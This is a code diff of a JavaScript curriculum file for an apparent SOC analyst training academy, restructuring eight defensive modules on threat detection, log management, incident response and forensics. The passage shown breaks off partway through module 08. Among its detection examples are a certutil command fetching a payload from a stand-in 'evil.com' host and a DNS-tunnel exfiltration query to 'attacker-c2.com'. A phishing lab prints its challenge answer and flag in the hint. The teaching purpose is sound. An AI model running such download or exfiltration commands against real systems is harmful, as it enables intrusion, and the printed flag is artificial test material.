@@ -1,22 +1,31 @@
 // CyberSOC Academy Master Pathway - 8 Enterprise Modules Curriculum Data
+// Curriculum aligned with official SOC Analyst certification standards:
+// Module 01: Security Operations and Management
+// Module 02: Understanding Cyber Threats, IoCs, and Attack Methodology
+// Module 03: Log Management
+// Module 04: Incident Detection and Triage
+// Module 05: Proactive Threat Detection
+// Module 06: Incident Response
+// Module 07: Forensic Investigation and Malware Analysis
+// Module 08: SOC for Cloud Environments
 // Author: Mohammed Moshii (CSA, CEH, NASA Hall of Fame)
 
 export const SOC_MODULES = [
   {
     id: "soc-mod-01",
-    slug: "soc-architecture-triage",
+    slug: "security-operations-management",
     moduleNumber: "01",
-    title: "SOC Fundamentals, Architecture & Incident Lifecycles",
+    title: "Security Operations and Management",
     category: "core",
-    categoryLabel: "Core Fundamentals",
+    categoryLabel: "Core Operations",
     status: "completed",
     progress: 100,
     difficulty: "Beginner",
     duration: "45 Mins",
     slideCount: 16,
     labCount: "3 Labs Completed (3/3)",
-    tags: ["NIST SP 800-61", "RFC 2828", "Escalation Flow"],
-    summary: "Establish defense operations foundation: SOC models, tier escalations, RFC 2828 taxonomy, and NIST SP 800-61 workflows.",
+    tags: ["SOC Models", "NIST SP 800-61", "SLA & Metrics"],
+    summary: "Establish defense operations foundation: SOC models, tier escalations, RFC 2828 taxonomy, MTTD/MTTR metrics, and NIST SP 800-61 workflows.",
     
     slides: [
       {
@@ -187,58 +196,58 @@ export const SOC_MODULES = [
 
   {
     id: "soc-mod-02",
-    slug: "network-traffic-wireshark-c2",
+    slug: "understanding-cyber-threats-iocs",
     moduleNumber: "02",
-    title: "Network Traffic Analysis & Packet Forensics",
+    title: "Understanding Cyber Threats, IoCs, and Attack Methodology",
     category: "core",
-    categoryLabel: "Core Fundamentals",
+    categoryLabel: "Core Operations",
     status: "completed",
     progress: 100,
     difficulty: "Intermediate",
     duration: "60 Mins",
     slideCount: 18,
     labCount: "5 Labs Completed (5/5)",
-    tags: ["Wireshark", "Zeek NSM", "DNS Exfil"],
-    summary: "Dissect anomalies in raw PCAP files, analyze TCP flags, write custom Snort signatures, and isolate covert DNS tunnels.",
+    tags: ["Cyber Kill Chain", "MITRE ATT&CK", "Pyramid of Pain"],
+    summary: "Analyze adversary tradecraft, Indicators of Compromise (IoCs), the Cyber Kill Chain, MITRE ATT&CK mapping, and dissect covert network exfiltration.",
 
     slides: [
       {
         id: 1,
-        title: "Network Telemetry in Blue Teaming",
-        subtitle: "The Wire Never Lies",
+        title: "The Cyber Kill Chain & Attack Lifecycle",
+        subtitle: "From Reconnaissance to Actions on Objectives",
         bullets: [
-          "Network telemetry (Full Packet Capture vs NetFlow/IPFIX vs Zeek metadata) provides unbiased evidence of adversary movement.",
-          "Network Security Monitoring (NSM) focuses on identifying Indicators of Compromise (IOCs) across perimeters and lateral segments.",
+          "Lockheed Martin Cyber Kill Chain: Recon ➔ Weaponization ➔ Delivery ➔ Exploitation ➔ Installation ➔ C2 ➔ Actions on Objectives.",
+          "Disrupting an adversary at ANY stage prior to Actions on Objectives neutralizes the intrusion.",
           "Attacker network lifecycle: Discovery ➔ Command & Control (C2) ➔ Data Staging ➔ Exfiltration."
         ],
         diagram: `
- [ Workstation ] ──────(Encrypted TLS / DNS / HTTP)──────> [ External C2 Server ]
-        │
-   [ NSM Tap / SPAN Port ]
-        │
-   [ Zeek / Suricata / Wireshark ] ➔ [ Alerts & PCAP Storage ]`,
-        takeaway: "Even when payloads are encrypted with TLS, metadata (SNI, JA3/JA4 fingerprints, packet jitter) exposes adversary infrastructure."
+ [ Recon ] ──> [ Weaponize ] ──> [ Deliver ] ──> [ Exploit ] ──> [ Install ] ──> [ C2 ] ──> [ Impact ]
+                                                       │
+ [ DEFENDER BREAKS CHAIN HERE ] <──────────────────────┘`,
+        takeaway: "The earlier in the kill chain an attack is detected, the less damage and lower the containment costs."
       },
       {
         id: 2,
-        title: "Wireshark Display Filter Superpowers",
-        subtitle: "Isolating Needle from Haystack in Gigabytes of Packets",
+        title: "The Pyramid of Pain",
+        subtitle: "How Much Pain Do You Cause the Adversary?",
         bullets: [
-          "Filter by protocol & methods: `http.request.method == 'POST'` (common for beacon check-ins and data exfil).",
-          "Identify cleartext credentials: `http contains 'password' || ftp contains 'USER'`.",
-          "Detect DNS anomalies: `dns.qry.name.len > 40` (indicator of Base64/Hex DNS tunneling).",
-          "Detect TCP port scans: `tcp.flags.syn == 1 && tcp.flags.ack == 0`."
+          "Hash Values (Trivial): MD5/SHA256 — Changing one byte changes the hash instantly.",
+          "IP Addresses (Easy): Attackers easily rotate cloud VPS or Tor exit nodes.",
+          "Domain Names (Simple): Fast-flux DNS and DGA rotate domains hourly.",
+          "TTPs - Tactics, Techniques & Procedures (Tough!): Forcing an adversary to change how they operate wastes months of R&D."
         ],
         diagram: `
- ┌────────────────────────────────────────────────────────┐
- │            ESSENTIAL WIRESHARK FILTERS                 │
- ├────────────────────────────────────────────────────────┤
- │ http.response.code == 200 && http.content_type         │
- │ ip.addr == 10.10.10.50 && !ip.addr == 10.10.10.1       │
- │ tcp.analysis.flags && !tcp.analysis.window_update      │
- │ frame contains "cmd.exe" || frame contains "/bin/sh"   │
- └────────────────────────────────────────────────────────┘`,
-        takeaway: "Mastering Wireshark display filters cuts incident triage time from hours to seconds."
+                   ▲  [ TTPs ]  ── Tough! (Behavioral Changes)
+                  / \\
+                 /   \\  [ Tools ]  ── Challenging (Rewrite payloads)
+                /     \\
+               /       \\  [ Network/Host Artifacts ] ── Annoying
+              /         \\
+             /           \\  [ Domain Names ] ── Simple
+            /             \\
+           /               \\  [ IP Addresses ] ── Easy
+          /─────────────────\\
+         /    HASH VALUES    \\ ── Trivial (One byte change)`
       },
       {
         id: 3,
@@ -248,13 +257,12 @@ export const SOC_MODULES = [
           "C2 Beaconing: Periodic outbound HTTP/HTTPS/DNS requests sent from compromised host to attacker listener requesting commands.",
           "Sleep Time: Interval between callbacks (e.g., 60 seconds).",
           "Jitter: Random variance percentage added to sleep time (e.g., 20%) to evade automated statistical detection.",
-          "How to spot: Search for regular periodic spikes in NetFlow histograms or repetitive URI patterns (e.g., `/api/v1/telemetry?id=...`)."
+          "How to spot: Search for regular periodic spikes in NetFlow histograms or repetitive URI patterns."
         ],
         diagram: `
  TIME ➔   [00:00]          [01:03]          [02:08]          [03:02]
  REQUEST:  POST /sync ────> POST /sync ────> POST /sync ────> POST /sync
- INTERVAL: ~60 sec + 5% jitter (Cobalt Strike / Sliver characteristic)`,
-        takeaway: "Look for high-frequency low-volume traffic to newly observed domains (NODs)."
+ INTERVAL: ~60 sec + 5% jitter (Cobalt Strike / Sliver characteristic)`
       },
       {
         id: 4,
@@ -265,20 +273,15 @@ export const SOC_MODULES = [
           "Adversary registers `attacker-c2.com` and runs an authoritative name server.",
           "Infected host queries: `bXlwYXNzd29yZDEyMw==.attacker-c2.com`. The encoded data is logged directly by the attacker's DNS server!",
           "Detection: High volume of Subdomain queries, unusually high entropy in domain labels, and high ratio of TXT/NULL record queries."
-        ],
-        diagram: `
- [ Compromised PC ] ──> Query: [Base64_Sensitive_Doc].c2.com ──> [ Internal DNS ]
-                                                                      │
- [ Attacker Nameserver ] <── Forwarded recursive query <──────────────┘
- (Extracts and reassembles document)`
+        ]
       }
     ],
 
     theory: {
-      overview: "Network packet analysis is the gold standard of digital forensics. In this section, we study how to parse network protocols, inspect packet bytes, and spot stealthy data exfiltration techniques.",
+      overview: "Understanding adversary attack methodology and Indicators of Compromise enables defenders to anticipate threat actor movements before sensitive assets are breached.",
       sections: [
         {
-          heading: "1. Core Protocol Indicators",
+          heading: "1. Core Protocol Indicators & Threat Signals",
           content: "Attackers blend in with legitimate network noise. Below are the key protocol features every SOC analyst checks:",
           table: {
             headers: ["Protocol", "Normal Behavior", "Malicious Anomaly Indicator"],
@@ -318,9 +321,9 @@ export const SOC_MODULES = [
 
   {
     id: "soc-mod-03",
-    slug: "endpoint-detection-sysmon-threat-hunting",
+    slug: "log-management",
     moduleNumber: "03",
-    title: "Endpoint Telemetry & Host-Based Detection",
+    title: "Log Management",
     category: "siem",
     categoryLabel: "SIEM & Telemetry",
     status: "completed",
@@ -329,96 +332,84 @@ export const SOC_MODULES = [
     duration: "55 Mins",
     slideCount: 20,
     labCount: "4 Labs Completed (4/4)",
-    tags: ["Sysmon v14", "WinEvent 4624", "Auditd"],
-    summary: "Audit Sysmon telemetry configs, detect Kerberoasting in Security.evtx, parse Linux Auditd, and isolate DLL process injection.",
+    tags: ["Log Pipeline", "Sysmon Telemetry", "Windows Events"],
+    summary: "Master centralized log collection, parsing, Syslog, Windows Security Events, Sysmon endpoint telemetry, and log retention architectures.",
 
     slides: [
       {
         id: 1,
-        title: "The Endpoint: Where Attacks Execute",
-        subtitle: "Why Standard Windows Event Logs are Insufficient",
+        title: "The Log Ingestion Architecture",
+        subtitle: "Collection, Parsing, Normalization, and Storage",
         bullets: [
-          "Standard Windows Security Logs (Event ID 4688) capture process creation, but lack critical context like parent processes, process hashes, and CLI arguments.",
-          "Microsoft Sysinternals Sysmon (System Monitor) is a device driver and service that logs rich endpoint telemetry directly to Windows Event Log (`Microsoft-Windows-Sysmon/Operational`).",
-          "Sysmon monitors process creation, network connections, memory access, file creation, and driver loading."
+          "Without complete, tamper-proof logs, incident reconstruction and root cause forensics are impossible.",
+          "Log Sources: Endpoints (Sysmon, Windows Event Log), Network Devices (Firewalls, Switches, NetFlow), Cloud Services (IAM, Audit trails).",
+          "Log Pipeline: Collection Agent ➔ Universal Forwarder ➔ Ingestion & Parsing (CIM Normalization) ➔ Indexing ➔ Storage & Retention."
         ],
         diagram: `
- [ User Action / Malware Execution ]
-                │
-                ▼
-      [ Sysmon Kernel Driver ]
-   (Tracks hashes, CLI, Parent PID)
-                │
-                ▼
- [ Windows Event Log: Event ID 1 ] ➔ [ SIEM Forwarder / Splunk ]`,
-        takeaway: "Without Sysmon or modern EDR, spotting LOLBAS (Living-off-the-Land Binaries) is nearly impossible."
+ [ Endpoints ]     [ Firewalls ]     [ Active Directory ]
+       │                 │                    │
+       ▼                 ▼                    ▼
+ [ Universal / Heavy Forwarders & Rsyslog Relays ]
+                         │
+                         ▼
+           [ SIEM Normalization (CIM) ]
+                         │
+                         ▼
+         [ Indexed Hot / Warm / Cold Tiers ]`
       },
       {
         id: 2,
-        title: "The Essential Sysmon Event IDs",
+        title: "The Essential Windows & Sysmon Event IDs",
         subtitle: "The Core Telemetry Registry for Threat Hunting",
         bullets: [
-          "Event ID 1: Process Creation (ProcessCommandLine, ParentImage, Hashes, Integrity Level).",
-          "Event ID 3: Network Connection (Initiated outbound TCP/UDP connection from an endpoint process).",
-          "Event ID 7: Image Loaded (DLLs loaded into a running process — vital for detecting DLL Sideloading).",
-          "Event ID 8: CreateRemoteThread (Injection into other processes like injecting into `explorer.exe`).",
-          "Event ID 10: ProcessAccess (Targeting LSASS memory for password extraction with Mimikatz)."
+          "Security.evtx ID 4624: Successful Logon (LogonType 2 Interactive, LogonType 3 Network, LogonType 10 RDP).",
+          "Security.evtx ID 4625: Failed Logon (Crucial for brute force and password spray detection).",
+          "Sysmon Event ID 1: Process Creation with full command-line arguments and parent process tree.",
+          "Sysmon Event ID 10: ProcessAccess (Monitoring LSASS handle acquisition for credential dumping)."
         ],
         diagram: `
  ┌────────────────────────────────────────────────────────┐
- │           TOP SYSMON THREAT HUNTING EVENTS             │
+ │           ESSENTIAL EVENT IDs FOR SOC LOGS             │
  ├──────────┬───────────────────────┬─────────────────────┤
- │ Event ID │ Name                  │ Attacker Tactic     │
+ │ Event ID │ Source                │ Security Value      │
  ├──────────┼───────────────────────┼─────────────────────┤
- │ ID 1     │ Process Creation      │ Execution (T1059)   │
- │ ID 3     │ Network Connection    │ C2 Callback (T1071) │
- │ ID 8     │ CreateRemoteThread    │ Injection (T1055)   │
- │ ID 10    │ ProcessAccess (LSASS) │ Credential Dump     │
- │ ID 11    │ FileCreate            │ Payload Drop (T1105)│
+ │ 4624     │ Security.evtx         │ Successful Auth     │
+ │ 4625     │ Security.evtx         │ Failed Auth / Spray │
+ │ Sysmon 1 │ Sysmon/Operational   │ Process Execution   │
+ │ Sysmon 3 │ Sysmon/Operational   │ Network Sockets     │
+ │ Sysmon 10│ Sysmon/Operational   │ LSASS Access / Dump │
  └──────────┴───────────────────────┴─────────────────────┘`
       },
       {
         id: 3,
-        title: "Parent-Child Process Anomalies",
+        title: "Parent-Child Process Anomalies in Logs",
         subtitle: "Spotting Malicious Spawning in Process Trees",
         bullets: [
           "Normal: `winword.exe` should NOT spawn `powershell.exe`, `cmd.exe`, or `cscript.exe`.",
           "Normal: Web servers like `w3wp.exe` (IIS) or `httpd.exe` should NEVER spawn command shells (`cmd.exe /c whoami`).",
           "Suspicious LOLBAS: `certutil.exe -urlcache -f http://evil.com/payload.exe` (Abusing certificate utility for download).",
           "Hunting query: Filter for `ParentImage: *\\winword.exe` AND `Image: *\\cmd.exe`."
-        ],
-        diagram: `
- BENIGN PARENT TREE:
- explorer.exe ➔ chrome.exe ➔ chrome.exe (renderer)
-
- MALICIOUS PARENT TREE:
- winword.exe ➔ powershell.exe -Enc ... ➔ certutil.exe ➔ beacon.exe`
+        ]
       },
       {
         id: 4,
         title: "Hunting Credential Dumping (LSASS)",
-        subtitle: "Detecting Mimikatz and Task Manager Memory Dumps",
+        subtitle: "Detecting Mimikatz and Memory Handle Acquisition",
         bullets: [
           "Local Security Authority Subsystem Service (`lsass.exe`) stores password hashes, Kerberos tickets, and cleartext credentials in memory.",
           "Mimikatz invokes `MiniDumpWriteDump` targeting LSASS with `PROCESS_ALL_ACCESS` or `PROCESS_VM_READ`.",
           "Sysmon Event ID 10 monitors `TargetImage: C:\\Windows\\system32\\lsass.exe`.",
           "Any non-standard process requesting handle permissions (`GrantedAccess: 0x1010` or `0x1FFFFF`) to LSASS triggers an immediate Critical Alert."
-        ],
-        diagram: `
- [ mimikatz.exe (PID: 4892) ] ──OpenProcess(0x1010)──> [ lsass.exe (PID: 620) ]
-                  │
-        [ Sysmon Event ID 10 Generated! ]
-        SourceImage: C:\\Users\\User\\Downloads\\mimikatz.exe
-        TargetImage: C:\\Windows\\System32\\lsass.exe`
+        ]
       }
     ],
 
     theory: {
-      overview: "Endpoints are the battleground where initial access occurs. This section arms analysts with precise event IDs and command-line execution patterns.",
+      overview: "Effective log management transforms massive streams of disparate system events into structured, searchable intelligence.",
       sections: [
         {
-          heading: "1. LOLBAS Cheat Sheet for SOC Triage",
-          content: "Attackers use pre-installed Windows utilities to bypass antivirus. Look for these exact flags:",
+          heading: "1. LOLBAS Cheat Sheet for SOC Log Review",
+          content: "Attackers use pre-installed Windows utilities to bypass antivirus. Look for these exact flags in log files:",
           table: {
             headers: ["Binary", "Legitimate Purpose", "Adversary Usage Syntax"],
             rows: [
@@ -469,9 +460,9 @@ export const SOC_MODULES = [
 
   {
     id: "soc-mod-04",
-    slug: "siem-operations-log-aggregation",
+    slug: "incident-detection-and-triage",
     moduleNumber: "04",
-    title: "SIEM Operations, Log Aggregation & Querying",
+    title: "Incident Detection and Triage",
     category: "siem",
     categoryLabel: "SIEM & Telemetry",
     status: "active",
@@ -480,8 +471,8 @@ export const SOC_MODULES = [
     duration: "65 Mins",
     slideCount: 22,
     labCount: "3 / 6 Labs Completed",
-    tags: ["Splunk SPL", "Elastic KQL", "Sigma Rules"],
-    summary: "Enterprise SPL scripting, Elastic KQL filters, unstructured regex extraction, and tuning Sigma rules against APT29 activity.",
+    tags: ["Alert Triage", "SIEM Correlation", "Splunk SPL"],
+    summary: "Detect suspicious activity via SIEM correlation rules, perform rapid alert triage, eliminate false positives, and validate true positive intrusions.",
 
     slides: [
       {
@@ -533,30 +524,18 @@ export const SOC_MODULES = [
           "Brute Force: 1 User Account attacked with 10,000 different passwords (causes rapid account lockout).",
           "Password Spraying: 10,000 User Accounts attacked with 1 or 2 common passwords (e.g. `Winter2026!`) over hours to avoid lockouts.",
           "Detection Logic for Spraying: Count distinct users failing authentication from a single source IP within a rolling time window (`dc(user) > 20`)."
-        ],
-        diagram: `
- BRUTE FORCE:
- Attacker ──> [ admin ] ➔ pass1, pass2, pass3... ➔ [ Account Locked! ]
-
- PASSWORD SPRAY:
- Attacker ──> [ user1, user2, user3... ] ➔ "Winter2026!" ➔ [ Undetected! ]`
+        ]
       },
       {
         id: 4,
-        title: "Hunting APT29 C2 in Splunk",
-        subtitle: "Statistical Outlier Detection for HTTPS Jitter Callbacks",
+        title: "Statistical Anomaly Triage in SIEM",
+        subtitle: "Outlier Detection for Beaconing & Lateral Movements",
         bullets: [
-          "APT29 (Nobelium / Cozy Bear) leverages HTTPS POST requests with randomized jitter to evade simple firewall timers.",
-          "Use statistical functions `avg(count)` and `stdev(count)` grouped by destination IP.",
-          "Evaluate delta between connection frequency and average to identify tight, programmatic check-in routines.",
-          "Cross-reference matched IPs with external threat intelligence and JA3 SSL client hashes."
-        ],
-        diagram: `
- index=botsv3 sourcetype="stream:http" http_method="POST"
- | bucket _time span=5m
- | stats count, distinct_count(uri) by src_ip, dest_ip, _time
- | eventstats avg(count) as avg_conn, stdev(count) as stdev_conn
- | where abs(count - avg_conn) < 2 AND count > 12`
+          "Adversaries customize beacon jitter to evade static timer alerts.",
+          "Use statistical commands `eventstats avg(count) as avg_c, stdev(count) as std_c by src_ip, dest_ip`.",
+          "Filter for low standard deviation indicating tight automated loops.",
+          "Cross-reference destination IPs against VirusTotal and AbuseIPDB feeds."
+        ]
       }
     ],
 
@@ -608,59 +587,53 @@ index=winsec EventCode=1102 OR EventCode=104
 
   {
     id: "soc-mod-05",
-    slug: "threat-intelligence-mitre-attack",
+    slug: "proactive-threat-detection",
     moduleNumber: "05",
-    title: "Threat Intelligence & MITRE ATT&CK Mapping",
+    title: "Proactive Threat Detection",
     category: "core",
-    categoryLabel: "Core Fundamentals",
+    categoryLabel: "Threat Hunting",
     status: "locked",
     progress: 0,
     difficulty: "Advanced",
     duration: "50 Mins",
     slideCount: 16,
     labCount: "4 Cyber Labs",
-    tags: ["MITRE ATT&CK", "MISP CTI", "YARA"],
-    summary: "Ingest MISP feeds, correlate adversary TTPs in ATT&CK Navigator, extract obfuscated IoCs via CyberChef, and draft YARA rules.",
+    tags: ["Threat Hunting", "Sigma Rules", "YARA Signatures"],
+    summary: "Execute hypothesis-driven threat hunting, create custom Sigma and YARA detection rules, and identify stealthy LOLBAS persistence.",
 
     slides: [
       {
         id: 1,
-        title: "The Pyramid of Pain",
-        subtitle: "How Much Pain Do You Cause the Adversary?",
+        title: "Proactive Threat Hunting Philosophy",
+        subtitle: "Assume Breach: Finding What Alerts Missed",
         bullets: [
-          "David Bianco's Pyramid of Pain illustrates how difficult it is for an attacker to change their operational tactics when defenders detect each layer.",
-          "Hash Values (Trivial): MD5/SHA256 — Changing one byte changes the hash instantly.",
-          "IP Addresses (Easy): Attackers easily rotate cloud VPS or Tor exit nodes.",
-          "Domain Names (Simple): Fast-flux DNS and DGA (Domain Generation Algorithms) rotate domains hourly.",
-          "TTPs - Tactics, Techniques & Procedures (Tough!): Forcing an adversary to change how they operate wastes months of their research and development."
+          "Reactive Detection: Waiting for an alert rule to trigger on known signatures.",
+          "Proactive Threat Hunting: Hypothesis-driven searching through historical telemetry assuming an adversary is already inside.",
+          "Hunting Loop: Hypothesis Formulation ➔ Telemetry Collection & Tool Execution ➔ Pattern Identification ➔ New Automated Detection."
         ],
         diagram: `
-                   ▲  [ TTPs ]  ── Tough! (Behavioral Changes)
-                  / \\
-                 /   \\  [ Tools ]  ── Challenging (Rewrite payloads)
-                /     \\
-               /       \\  [ Network/Host Artifacts ] ── Annoying
-              /         \\
-             /           \\  [ Domain Names ] ── Simple
-            /             \\
-           /               \\  [ IP Addresses ] ── Easy
-          /─────────────────\\
-         /    HASH VALUES    \\ ── Trivial (One byte change)`
+ ┌────────────────────────────────────────────────────────┐
+ │            THE PROACTIVE HUNTING CYCLE                 │
+ ├────────────────────────────────────────────────────────┤
+ │ 1. Formulate Hypothesis (e.g. "Adversary uses LOLBAS") │
+ │ 2. Query SIEM Telemetry & Endpoint Artifacts           │
+ │ 3. Uncover Anomalies & Unknown Unknowns               │
+ │ 4. Author Permanent Sigma / YARA Rule                  │
+ └────────────────────────────────────────────────────────┘`
       },
       {
         id: 2,
-        title: "The MITRE ATT&CK Matrix",
-        subtitle: "The Periodic Table of Adversary Tradecraft",
+        title: "Sigma Rule Architecture",
+        subtitle: "The Vendor-Agnostic Detection Standard",
         bullets: [
-          "ATT&CK stands for Adversarial Tactics, Techniques, and Common Knowledge.",
-          "14 Tactical Objectives: Reconnaissance, Resource Dev, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact.",
-          "Each technique is assigned an ID (e.g. T1059: Command and Scripting Interpreter, T1003: OS Credential Dumping).",
-          "Mapping telemetry to ATT&CK lets teams identify coverage gaps across defense silos."
+          "Sigma allows detection engineers to write detection signatures once in clean YAML and compile to Splunk SPL, Elastic KQL, or Sentinel.",
+          "Structure: title, status, description, logsource (category, product), detection (selection, condition), falsepositives.",
+          "Enables rapid sharing of newly discovered APT detection logic across the global blue team community."
         ]
       },
       {
         id: 3,
-        title: "YARA Rule Engineering",
+        title: "YARA Rule Engineering for Memory Hunting",
         subtitle: "Pattern Matching for Malware Analysts & SOC Hunters",
         bullets: [
           "YARA is the Swiss Army knife for pattern matching in binaries, files, and memory dumps.",
@@ -682,11 +655,11 @@ index=winsec EventCode=1102 OR EventCode=104
     ],
 
     theory: {
-      overview: "Threat intelligence transforms defensive operations from reactive firefighting into proactive anticipation. Below is the reference architecture.",
+      overview: "Proactive threat detection transforms defensive operations from reactive firefighting into systematic adversary hunting.",
       sections: [
         {
-          heading: "1. MITRE ATT&CK Core Tactic Summary",
-          content: "Enterprise defense maps all detections to these primary categories:",
+          heading: "1. MITRE ATT&CK Core Tactic Summary for Hunters",
+          content: "Enterprise hunters prioritize hypothesis development along these technique categories:",
           table: {
             headers: ["Tactic ID", "Name", "Key Techniques to Hunt"],
             rows: [
@@ -726,19 +699,142 @@ index=winsec EventCode=1102 OR EventCode=104
 
   {
     id: "soc-mod-06",
-    slug: "malware-triage-dynamic-sandboxing",
+    slug: "incident-response",
     moduleNumber: "06",
-    title: "Malware Triage & Dynamic Sandboxing",
+    title: "Incident Response",
     category: "ir",
     categoryLabel: "Incident Response",
     status: "locked",
     progress: 0,
     difficulty: "Advanced",
     duration: "65 Mins",
+    slideCount: 16,
+    labCount: "4 Simulation Labs",
+    tags: ["NIST SP 800-61", "Host Containment", "Playbooks"],
+    summary: "Execute the NIST SP 800-61 IR lifecycle. Triage malicious phishing emails, execute emergency host containment, and neutralize live ransomware outbreaks.",
+
+    slides: [
+      {
+        id: 1,
+        title: "The NIST Incident Response Lifecycle",
+        subtitle: "NIST SP 800-61 Rev 2 Four-Phase Standard",
+        bullets: [
+          "Phase 1: Preparation (Hardening, playbooks, tools, training, jump kits).",
+          "Phase 2: Detection & Analysis (Continuous triage, scoping incident boundaries, determining severity).",
+          "Phase 3: Containment, Eradication & Recovery (Host isolation, account resets, malware removal, system restoration).",
+          "Phase 4: Post-Incident Activity (Lessons Learned, forensic post-mortem, metrics review)."
+        ],
+        diagram: `
+ ┌────────────────────────────────────────────────────────┐
+ │                    1. PREPARATION                      │
+ └──────────────────────────┬─────────────────────────────┘
+                            ▼
+ ┌────────────────────────────────────────────────────────┐
+ │               2. DETECTION & ANALYSIS                  │
+ └──────────────────────────┬─────────────────────────────┘
+                            ▼
+ ┌────────────────────────────────────────────────────────┐
+ │       3. CONTAINMENT, ERADICATION & RECOVERY           │
+ └──────────────────────────┬─────────────────────────────┘
+                            ▼
+ ┌────────────────────────────────────────────────────────┐
+ │                4. POST-INCIDENT ACTIVITY               │
+ └────────────────────────────────────────────────────────┘`
+      },
+      {
+        id: 2,
+        title: "Ransomware Emergency Containment Playbook",
+        subtitle: "Actions in the First 10 Minutes of Outbreak",
+        bullets: [
+          "Minute 0-2: Sever the Network — Isolate infected host via EDR network containment or physical cable disconnect. DO NOT power off (preserves RAM!).",
+          "Minute 2-5: Scope Lateral Infection — Check Active Directory for mass kerberoasting or anomalous SMB writes across network file shares.",
+          "Minute 5-7: Kill Active Process & Revoke Credentials — Suspend malicious PID, reset compromised Domain Admin tokens.",
+          "Minute 7-10: Block C2 & External Communications — Apply immediate firewall blackholes and DNS RPZ blocks."
+        ],
+        diagram: `
+ [ RANSOMWARE DETECTED ] ➔ [ ISOLATE HOST (EDR) ] ➔ [ DO NOT SHUT DOWN (Preserve RAM) ]
+                                    │
+ [ Reset Compromised AD Account ] <─┴─> [ Blackhole C2 IP on Perimeter Firewall ]`
+      },
+      {
+        id: 3,
+        title: "Phishing Email Header Forensics",
+        subtitle: "Unmasking Spoofed Senders in MIME Headers",
+        bullets: [
+          "Look at the `Received:` headers from bottom to top (bottom-most is the originating sending server).",
+          "`Authentication-Results`: Check SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC passes or fails.",
+          "`Reply-To`: Often differs from the display name to redirect victim responses to the attacker inbox.",
+          "Attachment Triage: Check hash on VirusTotal, inspect macros in `.docm` or `.xlsm` using `olevba`."
+        ]
+      }
+    ],
+
+    theory: {
+      overview: "When active intrusion occurs, seconds matter. Here are the operational commands and playbooks utilized by Incident Responders.",
+      sections: [
+        {
+          heading: "1. Critical Containment Commands",
+          content: "Use these operational commands to sever attacker control on Windows hosts:",
+          codeBlock: `# 1. Emergency Host Isolation (Windows Firewall block all except management)
+netsh advfirewall set allprofiles state on
+netsh advfirewall firewall add rule name="EMERGENCY_ISOLATE" dir=out action=block
+netsh advfirewall firewall add rule name="EMERGENCY_ISOLATE_IN" dir=in action=block
+
+# 2. Kill Malicious Process Tree
+taskkill /F /PID [MALICIOUS_PID] /T
+
+# 3. Disable Compromised Active Directory Account
+Disable-ADAccount -Identity "CompromisedUser"
+
+# 4. Dump RAM for Forensics using WinPmem
+winpmem.exe -o C:\\Forensics\\mem_dump.raw`
+        }
+      ]
+    },
+
+    lab: {
+      title: "Interactive Phishing Email Header Analyzer",
+      scenario: "A finance employee reported an email claiming to be from the CEO demanding urgent wire transfer. Review the raw email headers to identify the real sender IP and phishing attachment.",
+      type: "email-header-sim",
+      rawHeaders: `From: "CEO John Miller" <john.miller@ceo-corporate.com>
+To: sarah.connor@corp.local
+Subject: URGENT: Wire Transfer Invoice Attached
+Date: Thu, 26 Nov 2026 04:12:10 +0000
+Return-Path: <attacker@spoofed-phish-domain.xyz>
+Received: from mail.spoofed-phish-domain.xyz (mail.spoofed-phish-domain.xyz [198.51.100.77])
+    by mail.corp.local with ESMTP id a91k28fa;
+Authentication-Results: mail.corp.local;
+    spf=fail (sender IP 198.51.100.77 is not permitted)
+    dmarc=fail (p=reject)
+Attachment: Invoice_November_2026.pdf.exe
+SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`,
+      taskInstructions: "1. Inspect the Authentication-Results: SPF and DMARC failed.\n2. Note the originating IP address: 198.51.100.77.\n3. Identify the double extension in the attachment: 'Invoice_November_2026.pdf.exe'."
+    },
+
+    challenge: {
+      question: "What is the true originating IP address of the attacker mail server that sent the spoofed email?",
+      targetKey: "198.51.100.77",
+      flag: "flag{ph1sh1ng_c0nta1nm3nt_succ3ss}",
+      hint: "Look at the Received header and Authentication-Results: sender IP is 198.51.100.77. The flag is flag{ph1sh1ng_c0nta1nm3nt_succ3ss}",
+      points: 150
+    }
+  },
+
+  {
+    id: "soc-mod-07",
+    slug: "forensic-investigation-malware-analysis",
+    moduleNumber: "07",
+    title: "Forensic Investigation and Malware Analysis",
+    category: "ir",
+    categoryLabel: "Forensics & Malware",
+    status: "locked",
+    progress: 0,
+    difficulty: "Advanced",
+    duration: "70 Mins",
     slideCount: 18,
     labCount: "5 Dynamic Labs",
-    tags: ["Hybrid Sandbox", "Volatility 3", "PE Headers"],
-    summary: "Safe detonation in isolated sandboxes, static PE header analysis, macro de-obfuscation, and memory dump triage using Volatility 3.",
+    tags: ["Volatility 3", "Sandbox Triage", "Memory Forensics"],
+    summary: "Perform static and dynamic malware triage in safe sandboxes, memory forensics using Volatility 3, and digital artifact recovery.",
 
     slides: [
       {
@@ -837,213 +933,119 @@ Tag: LummaStealer_MemoryInjected_Payload_v4`,
   },
 
   {
-    id: "soc-mod-07",
-    slug: "live-incident-response-playbooks",
-    moduleNumber: "07",
-    title: "Live Incident Response & Playbook Automation",
+    id: "soc-mod-08",
+    slug: "soc-for-cloud-environments",
+    moduleNumber: "08",
+    title: "SOC for Cloud Environments",
     category: "ir",
-    categoryLabel: "Incident Response",
+    categoryLabel: "Cloud Defense",
     status: "locked",
     progress: 0,
     difficulty: "Advanced",
-    duration: "70 Mins",
+    duration: "60 Mins",
     slideCount: 16,
-    labCount: "4 Simulation Labs",
-    tags: ["SOAR Playbooks", "Containment", "Chain of Custody"],
-    summary: "Construct automated SOAR response workflows, enforce active ransomware containment, manage evidence custody, and author PIR root cause logs.",
+    labCount: "4 Cloud Range Labs",
+    tags: ["AWS CloudTrail", "Azure Sentinel", "Cloud IAM Security"],
+    summary: "Monitor AWS CloudTrail, Azure Monitor, and Google Cloud Audit Logs. Hunt cloud IAM privilege escalation, bucket leaks, and container attacks.",
 
     slides: [
       {
         id: 1,
-        title: "The NIST Incident Response Lifecycle",
-        subtitle: "NIST SP 800-61 Rev 2 Four-Phase Standard",
+        title: "The Cloud Threat Surface",
+        subtitle: "Shared Responsibility & Multi-Cloud Observability",
         bullets: [
-          "Phase 1: Preparation (Hardening, playbooks, tools, training, jump kits).",
